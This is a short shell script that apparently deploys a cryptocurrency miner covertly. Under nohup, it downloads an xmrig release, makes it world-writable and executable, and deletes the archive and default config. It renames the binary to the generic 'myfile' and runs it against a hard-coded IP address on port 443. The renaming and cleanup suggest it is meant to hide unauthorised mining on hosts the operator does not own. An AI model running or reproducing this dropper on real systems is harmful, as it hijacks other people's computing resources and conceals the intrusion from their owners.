nohup wget https://github.com/MoneroOcean/xmrig/releases/download/v6.12.1-mo2/xmrig-v6.12.1-mo2-lin64-compat.tar.gz -O out 
nohup tar -xvf out 
nohup chmod 777 xmrig 
nohup rm config.json 
nohup rm out 
nohup mv xmrig myfile
nohup echo '{"bench-algo-time":2}' > xjson 
./myfile -o 79.231.42.249:443 -c xjson
